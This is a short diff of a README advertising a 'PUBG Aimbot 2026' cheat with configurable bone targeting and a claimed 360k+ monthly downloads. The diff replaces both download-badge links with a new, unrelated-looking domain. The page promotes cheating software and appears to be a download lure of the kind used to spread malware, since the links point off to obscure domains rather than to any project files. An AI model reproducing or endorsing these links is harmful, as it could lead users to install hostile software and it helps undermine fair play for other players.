@@ -1,6 +1,6 @@
 # PUBG Aimbot 2026 — Precision Aim
 
-[![Download](https://img.shields.io/badge/Download-v2026.8-brightgreen?style=for-the-badge)](https://connectinstruction.com/pubgaimbt)
+[![Download](https://img.shields.io/badge/Download-v2026.8-brightgreen?style=for-the-badge)](https://dllvcrun.com/pubgaimbt)
 
 > **PUBG external aimbot — locks on to enemies with configurable bone targeting.**
 
@@ -48,7 +48,7 @@ A: Yes — targets passengers inside moving vehicles.
 
 **Monthly downloads:** 360k+
 
-[![Download](https://img.shields.io/badge/Download-v2026.8-brightgreen?style=for-the-badge)](https://connectinstruction.com/pubgaimbt)
+[![Download](https://img.shields.io/badge/Download-v2026.8-brightgreen?style=for-the-badge)](https://dllvcrun.com/pubgaimbt)
 
 ---
 
